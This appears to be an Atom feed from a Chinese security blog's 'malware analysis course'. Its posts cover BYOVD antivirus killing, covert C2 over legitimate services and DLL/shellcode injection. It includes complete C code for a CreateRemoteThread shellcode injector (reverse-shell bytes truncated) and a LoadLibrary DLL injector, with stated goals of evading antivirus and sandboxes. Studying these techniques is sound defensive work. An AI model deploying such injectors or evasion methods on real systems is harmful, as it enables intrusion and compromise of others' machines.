<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CHANGMEN&#39;个人博客</title>
  
  
  <link href="https://250wuyifan.github.io/atom.xml" rel="self"/>
  
  <link href="https://250wuyifan.github.io/"/>
  <updated>2025-11-11T14:08:53.268Z</updated>
  <id>https://250wuyifan.github.io/</id>
  
  <author>
    <name>CHANGMEN</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶意代码分析系列课程-Shellcode反射DLL注入</title>
    <link href="https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-Shellcode%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-Shellcode%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-11-11T14:08:53.000Z</published>
    <updated>2025-11-11T14:08:53.268Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析系列课程-一次最新工具的BYOVD分析</title>
    <link href="https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%B8%80%E6%AC%A1%E6%9C%80%E6%96%B0%E5%B7%A5%E5%85%B7%E7%9A%84BYOVD%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%B8%80%E6%AC%A1%E6%9C%80%E6%96%B0%E5%B7%A5%E5%85%B7%E7%9A%84BYOVD%E5%88%86%E6%9E%90/</id>
    <published>2025-11-11T14:05:56.000Z</published>
    <updated>2025-11-11T14:11:08.713Z</updated>
    
    <content type="html"><![CDATA[<p>在twitter上刷的时候，看到了一个推文</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111213429900.png" alt="image-20251111213429900"></p><p>一眼就知道是用了驱动进行关闭的杀毒，所以现在的思路是拿到驱动，进行分析，然后写用户态就行，这是BYOVD基本的思路，不是读写就是关闭函数。</p><p>自然就是千方百计的拿到了驱动</p><p>让AI给我写了一下如何调用。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/bc92acfcb92975c96fdf3a63a890d855.png" alt="bc92acfcb92975c96fdf3a63a890d855"></p><p>IDA分析起来也是巨简单。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111215908963.png" alt="image-20251111215908963"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111215931160.png" alt="image-20251111215931160"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111215948716.png" alt="image-20251111215948716"></p><p>一路按X就完事了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111220016635.png" alt="image-20251111220016635"></p><p>一路跟到这里发现下面有个IofCompleteRequest((PIRP)a2, 0);那么我们就想到了这就是一个分发函数的地方。</p><p>那只要看看调用号是多少，注册设备对象，然后用户态发出请求给内核就行了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111220049915.png" alt="image-20251111220049915"></p><p>写代码就好了。</p><p>测试360主动防御</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/18b647a3d6ad020a85757559bd11316f.png" alt="18b647a3d6ad020a85757559bd11316f"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/55939e6a814df19a752fc038d29313e1.png" alt="55939e6a814df19a752fc038d29313e1"></p><p>但是但是LOLdrive其实已经记载了，没办法</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111220515611.png" alt="image-20251111220515611"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在twitter上刷的时候，看到了一个推文&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111213429900.png&quot; alt=</summary>
      
    
    
    
    
    <category term="恶意代码分析系列课程" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析系列课程-合法服务的隐蔽C2</title>
    <link href="https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%90%88%E6%B3%95%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9A%90%E8%94%BDC2/"/>
    <id>https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%90%88%E6%B3%95%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9A%90%E8%94%BDC2/</id>
    <published>2025-11-08T08:52:51.000Z</published>
    <updated>2025-11-08T12:11:06.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/news/16258">https://xz.aliyun.com/news/16258</a></p><p>利用合法服务进行C2，流量上都是白名单，这样在流量上就不会被判断为恶意流量。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251108200758912.png" alt="image-20251108200758912"></p><p>主要还是在本地执行命令，只不过要获取执行的命令，再把执行后的结果通过接口发给这个通讯工具。</p><h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><p>1.经过测试，使用沙箱直接就可以抓到http请求，使用的token也被抓下来，这个地方如果要保护C2的话需要做一个处理。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;&gt;&lt;/a&gt;参考文章&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/16258&quot;&gt;https://xz.aliyun.c</summary>
      
    
    
    
    
    <category term="恶意代码分析系列课程" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析系列课程-反射DLL注入</title>
    <link href="https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-11-07T16:12:47.000Z</published>
    <updated>2025-11-08T08:56:14.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/fdxsec/p/18300826">https://www.cnblogs.com/fdxsec/p/18300826</a></p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>PE文件结构。</p><p>PEB</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;&gt;&lt;/a&gt;参考文章&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/fdxsec/p/18300826&quot;&gt;https://ww</summary>
      
    
    
    
    
    <category term="恶意代码分析系列课程" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析系列课程-CreateRemoteThread Shellcode 注入</title>
    <link href="https://250wuyifan.github.io/2025/11/05/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-CreateRemoteThread-Shellcode-%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/11/05/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-CreateRemoteThread-Shellcode-%E6%B3%A8%E5%85%A5/</id>
    <published>2025-11-04T16:02:52.000Z</published>
    <updated>2025-11-07T11:56:08.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="远程线程shellcode注入"><a href="#远程线程shellcode注入" class="headerlink" title="远程线程shellcode注入"></a>远程线程shellcode注入</h1><p>本节介绍将 Shellcode 注入本地进程的方法，<strong>Shellcode</strong> 的本质是一段机器可执行的二进制代码。它的名字来源于最初的目的：执行一段能“启动一个命令行 shell”的代码。我们注入的目的就是让某个进程执行我们的shellcode进行上线。</p><p>生成用于反向 shell 的 shellcode：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251107005233443.png" alt="image-20251107005233443"></p><h1 id="本地加载"><a href="#本地加载" class="headerlink" title="本地加载"></a>本地加载</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251107005310192.png" alt="image-20251107005310192"></p><h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">        <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\...&quot;</span>;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    DWORD threadId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 用法: %s &lt;目标进程PID&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD targetPID = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 目标进程PID: %d\n&quot;</span>, targetPID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 打开目标进程</span></span><br><span class="line">    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);</span><br><span class="line">    <span class="keyword">if</span> (processHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 无法打开进程! 错误代码: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 提示: 请确保以管理员权限运行，且目标进程存在\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 成功打开目标进程\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 在目标进程中分配内存</span></span><br><span class="line">    remoteBuffer = VirtualAllocEx(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode),</span><br><span class="line">        (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (remoteBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 内存分配失败! 错误代码: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        CloseHandle(processHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 在目标进程分配内存: 0x%p\n&quot;</span>, remoteBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 写入shellcode</span></span><br><span class="line">    SIZE_T bytesWritten;</span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="keyword">sizeof</span>(shellcode), &amp;bytesWritten)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 写入内存失败! 错误代码: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(processHandle, remoteBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(processHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 成功写入 %zu 字节 shellcode\n&quot;</span>, bytesWritten);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 创建远程线程</span></span><br><span class="line">    remoteThread = CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)remoteBuffer,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 创建远程线程失败! 错误代码: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(processHandle, remoteBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(processHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 成功创建远程线程，线程ID: %d\n&quot;</span>, threadId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 等待线程执行（可选）</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 等待shellcode执行...\n&quot;</span>);</span><br><span class="line">    WaitForSingleObject(remoteThread, <span class="number">1000</span>);  <span class="comment">// 等待1秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 清理资源</span></span><br><span class="line">    CloseHandle(remoteThread);</span><br><span class="line">    CloseHandle(processHandle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 注入完成!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251107012202658.png" alt="image-20251107012202658"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;远程线程shellcode注入&quot;&gt;&lt;a href=&quot;#远程线程shellcode注入&quot; class=&quot;headerlink&quot; title=&quot;远程线程shellcode注入&quot;&gt;&lt;/a&gt;远程线程shellcode注入&lt;/h1&gt;&lt;p&gt;本节介绍将 Shellcode 注入</summary>
      
    
    
    
    
    <category term="恶意代码分析系列课程" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析系列课程-DLL Injection</title>
    <link href="https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-DLL-Injection/"/>
    <id>https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-DLL-Injection/</id>
    <published>2025-11-04T14:09:56.000Z</published>
    <updated>2025-11-06T14:34:17.646Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h1><p>参考文章：<a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a></p><p>这种手法是将 DLL 注入远程进程。众所周知dll就是一个动态链接库，比如kernel32.dll，里面包含很多函数供我们使用。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104221312522.png" alt="image-20251104221312522"></p><p>vs创建一个dll项目之后，给我们的代码是如下</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104221750916.png" alt="image-20251104221750916"></p><p>下面是清楚地注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span>  <span class="comment">// 预编译头文件，包含常用的 Windows API 头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DllMain - DLL 入口点函数</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 这是 Windows DLL 的主入口函数，当 DLL 被加载、卸载或线程创建/销毁时会被调用</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param hModule          - 当前 DLL 模块的句柄（可以理解为 DLL 的标识符）</span></span><br><span class="line"><span class="comment"> * @param ul_reason_for_call - 调用原因（为什么调用这个函数）</span></span><br><span class="line"><span class="comment"> * @param lpReserved       - 保留参数（通常不使用）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @return TRUE  - 表示初始化成功</span></span><br><span class="line"><span class="comment"> * @return FALSE - 表示初始化失败（DLL 会被卸载）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">                      DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                      LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 根据不同的调用原因执行不同的操作</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// 当 DLL 第一次被某个进程加载时调用（只调用一次）</span></span><br><span class="line">        <span class="comment">// 适合做初始化工作：</span></span><br><span class="line">        <span class="comment">//   - 分配内存</span></span><br><span class="line">        <span class="comment">//   - 初始化全局变量</span></span><br><span class="line">        <span class="comment">//   - 创建互斥锁</span></span><br><span class="line">        <span class="comment">//   - 打开文件/数据库连接</span></span><br><span class="line">        <span class="comment">// 示例：</span></span><br><span class="line">        <span class="comment">// MessageBox(NULL, &quot;DLL 已加载到进程&quot;, &quot;提示&quot;, MB_OK);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="comment">// 当进程创建一个新线程时调用（除了第一个线程）</span></span><br><span class="line">        <span class="comment">// 适合做线程相关的初始化工作：</span></span><br><span class="line">        <span class="comment">//   - 分配线程局部存储（TLS）</span></span><br><span class="line">        <span class="comment">//   - 初始化线程特定的数据</span></span><br><span class="line">        <span class="comment">// 注意：主线程不会触发这个，只有后续创建的线程才会</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="comment">// 当线程正常退出时调用（除了最后一个线程）</span></span><br><span class="line">        <span class="comment">// 适合做线程清理工作：</span></span><br><span class="line">        <span class="comment">//   - 释放线程局部存储</span></span><br><span class="line">        <span class="comment">//   - 清理线程特定的资源</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="comment">// 当 DLL 从进程中卸载时调用（只调用一次）</span></span><br><span class="line">        <span class="comment">// 适合做清理工作：</span></span><br><span class="line">        <span class="comment">//   - 释放分配的内存</span></span><br><span class="line">        <span class="comment">//   - 关闭文件句柄</span></span><br><span class="line">        <span class="comment">//   - 释放互斥锁</span></span><br><span class="line">        <span class="comment">//   - 关闭数据库连接</span></span><br><span class="line">        <span class="comment">// 示例：</span></span><br><span class="line">        <span class="comment">// MessageBox(NULL, &quot;DLL 即将卸载&quot;, &quot;提示&quot;, MB_OK);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回 TRUE 表示 DLL 初始化成功</span></span><br><span class="line">    <span class="comment">// 如果返回 FALSE，DLL 会被立即卸载</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在dllmain下面函数里面加几个弹窗，再加几个导出函数。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104222335220.png" alt="image-20251104222335220"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104222349886.png" alt="image-20251104222349886"></p><p>我这里使用cff explorer查看导出表，可以看到写的导出函数。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104222924255.png" alt="image-20251104222924255"></p><p>写一行加载器，用到了LoadLibraryA，就是加载器。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104223345999.png" alt="image-20251104223345999"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104223325982.png" alt="image-20251104223325982"></p><p>当执行LoadLibraryA的时候，就会触发这个DLL_PROCESS_ATTACH，那么我写恶意dll的时候，就写在这个case里面， 那么如果在别的进程里执行一下这个LoadLibrary是不是直接就触发dll里面写的上线。</p><p>那么我们来看参考网站里面他的写法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">HANDLE processHandle;</span><br><span class="line">PVOID remoteBuffer;</span><br><span class="line"><span class="type">wchar_t</span> dllPath[] = TEXT(<span class="string">&quot;C:\\experiments\\evilm64.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Injecting DLL to PID: %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[<span class="number">1</span>])));</span><br><span class="line">remoteBuffer = VirtualAllocEx(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, <span class="keyword">sizeof</span> dllPath, <span class="literal">NULL</span>);</span><br><span class="line">PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, threatStartRoutineAddress, remoteBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(processHandle); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个思路就是把dll写入进程的一个开辟的空间内，然后创建线程使用LoadLibrary函数即可。</p><p>我们可以看一下关键的CreateRemoteThread函数，这个看名字就知道是创建远程线程，官网搜一下看一下参数，之后遇到不会的函数也建议直接搜官网，然后根据AI了解即可。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104232857827.png" alt="image-20251104232857827"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DLL-Injection&quot;&gt;&lt;a href=&quot;#DLL-Injection&quot; class=&quot;headerlink&quot; title=&quot;DLL Injection&quot;&gt;&lt;/a&gt;DLL Injection&lt;/h1&gt;&lt;p&gt;参考文章：&lt;a href=&quot;https://www.</summary>
      
    
    
    
    
